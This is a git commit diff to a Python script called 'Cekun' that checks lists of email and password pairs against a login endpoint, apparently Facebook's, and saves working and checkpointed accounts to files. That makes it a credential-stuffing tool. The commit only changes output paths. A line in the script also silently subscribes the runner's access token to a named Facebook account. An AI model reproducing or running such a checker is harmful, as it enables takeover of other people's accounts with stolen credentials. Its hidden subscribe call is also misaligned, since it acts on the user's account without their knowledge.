a4e32a28a34965bfc391da920e48378f320f7abf
NOOBIE <44431105+KANG-NEWBIE@users.noreply.github.com>
2019-06-22 23:39:11 +0700

    Add files via upload

--- src/Cekun.py
+++ src/Cekun.py
@@ -8,6 +8,9 @@ class Cekun:
 		self.cek()
 
 	def cek(self):
+		try:
+			os.mkdir('result')
+		except: pass
 		print("""
 		;;;;;;;;;;;;;;;;;;;;
 		; Checker Accounts ;
@@ -15,7 +18,7 @@ class Cekun:
 		""")
 		folme=self.req.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+self.ken)
 		try:
-			os.mkdir('checker')
+			os.mkdir('result/checker')
 		except: pass
 		fil=input('[info] list sparator email|pass\n[?] list accounts: ')
 		file=open(fil,'r').read().splitlines()
@@ -30,15 +33,15 @@ class Cekun:
 		rr=self.req.post(self.u,data={'email':id,'pass':pas})
 		if 'save-device' in rr.text or 'm_sess' in rr.text:
 			print(f'\033[97m[\033[92mAlive\033[97m] {id} - {pas}')
-			f=open('checker/alive.txt','a')
+			f=open('result/checker/alive.txt','a')
 			f.write(f'{id}|{pas}\n')
 			f.close()
 		elif 'checkpoint' in rr.text:
 			print(f'\033[97m[\033[93mCheckP\033[97m] {id} - {pas}')
-			c=open('checker/check.txt','a')
+			c=open('result/checker/check.txt','a')
 			c.write(f'{id}|{pas}\n')
 			c.close()
-			
+
 Cekun()
-print('\n[info] alive file saved as checker/alive.txt')
-print('[info] checkpoint file saved as checker/check.txt')
+print('\n[info] alive file saved as \033[94mresult/checker/alive.txt\033[97m')
+print('[info] checkpoint file saved as \033[94mresult/checker/check.txt')
